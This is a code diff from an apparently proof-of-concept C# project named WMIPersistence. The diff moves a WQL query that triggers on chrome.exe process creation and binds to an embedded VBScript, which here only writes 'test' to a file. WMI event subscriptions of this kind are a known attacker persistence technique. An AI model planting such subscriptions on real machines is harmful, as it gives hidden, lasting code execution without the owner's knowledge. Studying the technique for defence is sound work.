@@ -19,16 +19,17 @@ namespace WMIPersistence
       ManagementObject myEventConsumer = null;
       ManagementObject myBinder = null;
 
-      string vbscript = "Dim fso, MyFile : Set fso = CreateObject(\"Scripting.FileSystemObject\") : Set MyFile = fso.CreateTextFile(\"c:\\WMI-CSharp-vbs.txt\", True) : MyFile.WriteLine(\"test\") : MyFile.Close";
+      String vbscript = "Dim fso, MyFile : Set fso = CreateObject(\"Scripting.FileSystemObject\") : Set MyFile = fso.CreateTextFile(\"c:\\WMI-CSharp-vbs.txt\", True) : MyFile.WriteLine(\"test\") : MyFile.Close";
+      String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
+                           "WHERE TargetInstance ISA \"Win32_Process\" " +
+                           "AND TargetInstance.Name = \"chrome.exe\"";
 
       try
       {
         ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
 
         ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
-        String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
-                           "WHERE TargetInstance ISA \"Win32_Process\" " +
-                           "AND TargetInstance.Name = \"chrome.exe\"";
+
 
         WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
         myEventFilter = wmiEventFilter.CreateInstance();
